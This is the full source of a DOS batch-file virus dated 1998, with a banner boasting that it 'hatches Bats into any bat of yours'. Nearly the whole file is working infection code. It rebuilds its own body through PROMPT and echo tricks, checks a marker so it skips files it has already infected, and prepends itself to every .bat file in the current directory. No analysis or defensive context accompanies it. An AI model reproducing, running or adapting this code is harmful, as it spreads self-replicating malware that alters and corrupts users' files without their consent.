@if _%1==_Memory_Allocated_Go_Ahead goto ~GetMem
@if _%1==_The_Call_of_Ktulu goto ~Ktulu
@if _%1==_Wake_the_Fiend goto ~Damage_Inc
@if _%1==_Hatch_the_Heir goto ~Heir
@echo ..................................................
@echo :       -  --=[ Demo BAT by Sassa ]=--  -        :
@echo :      this batch-file is a bitch-file now       :
@echo :     it hatches Bats into any bat of yours      :
@echo :        now they too will be possessed          :
@echo : with This Bat, which is rather DEMON than Demo :
@echo :         (c) 18 Nov 1998, Apiary Inc.           :
@echo :........................................ v 2.0 .:
@command.com /E:10000 /C %0 Memory_Allocated_Go_Ahead >nul
@goto :~~exit
:
:
:asking_for_infection
:
@echo ~>~~~3.bat
@exit
:
:~Heir
@echo @echo @
@echo @echo @command.com /C ~~~1.bat
@echo @echo @
@echo @exit
@exit
:
:~GetMem
set PROMPT=$a
set prc=%%
set prc=%prc%prc%prc%
command.com /C %0 Hatch_the_Heir >~~~1.bat
command.com /E:10000 /C %0 The_Call_of_Ktulu >~~~~2.bat
set prc=%%
:
command.com /E:10000 /C ~~~~3.bat >~~~1.bat
set PROMPT=$a
type ~~~~2.bat>>~~~1.bat
type ~~~~4.bat>>~~~1.bat
del ~~~~*.bat
:
for %%i in (*.bat) do command.com /C %0 Wake_the_Fiend %%i%
del ~~~1.bat
:
exit
:
:~Damage_Inc
echo goto asking_for_infection>~~~2.bat
type %2>>~~~2.bat
command.com /C ~~~2.bat
if not EXIST ~~~3.bat goto ~~Chew_It
:
del ~~~3.bat
goto ~~Spit_out
:
:~~Chew_It
type ~~~1.bat>~~~2.bat
type %2>>~~~2.bat
type ~~~2.bat>%2
:
:~~Spit_out
del ~~~2.bat
exit
:
:~Ktulu
@
@command.com /C ~~~1.bat
@
echo @echo @if _%prc%1==_Memory_Allocated_Go_Ahead goto ~GetMem>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @if _%prc%1==_The_Call_of_Ktulu goto ~Ktulu>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @if _%prc%1==_Wake_the_Fiend goto ~Damage_Inc>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @if _%prc%1==_Hatch_the_Heir goto ~Heir>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo ..................................................>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :       -  --=[ Demo BAT by Sassa ]=--  -        :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :      this batch-file is a bitch-file now       :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :     it hatches Bats into any bat of yours      :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :        now they too will be possessed          :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo : with This Bat, which is rather DEMON than Demo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :         (c) 18 Nov 1998, Apiary Inc.           :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo :........................................ v 2.0 .:>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=@command.com /E:10000 /C %prc%0 Memory_Allocated_Go_Ahead $gnul>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @goto :~~exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :asking_for_infection>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=@echo ~$g~~~3.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~Heir>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo @echo @>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo @echo @command.com /C ~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo @echo @>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @echo @exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo @exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~GetMem>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo set PROMPT=$a>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo set prc=%prc%%prc%>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo set prc=%prc%prc%prc%prc%prc%prc%prc%>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=command.com /C %prc%0 Hatch_the_Heir $g~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=command.com /E:10000 /C %prc%0 The_Call_of_Ktulu $g~~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo set prc=%prc%%prc%>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=command.com /E:10000 /C ~~~~3.bat $g~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo set PROMPT=$a>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type ~~~~2.bat$g$g~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type ~~~~4.bat$g$g~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo del ~~~~*.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo for %prc%%prc%i in (*.bat) do command.com /C %prc%0 Wake_the_Fiend %prc%%prc%i%prc%>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo del ~~~1.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~Damage_Inc>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=echo goto asking_for_infection$g~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type %prc%2$g$g~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo command.com /C ~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo if not EXIST ~~~3.bat goto ~~Chew_It>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo del ~~~3.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo goto ~~Spit_out>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~~Chew_It>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type ~~~1.bat$g~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type %prc%2$g$g~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @set PROMPT=type ~~~2.bat$g%prc%2>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo ;>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~~Spit_out>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo del ~~~2.bat>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @echo :~Ktulu>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo @exit>>~~~~3.bat
@
@command.com /C ~~~1.bat
@
echo :>~~~~4.bat
@
@command.com /C ~~~1.bat
@
echo :~~exit>>~~~~4.bat
@
@command.com /C ~~~1.bat
@
exit
:
:~~exit
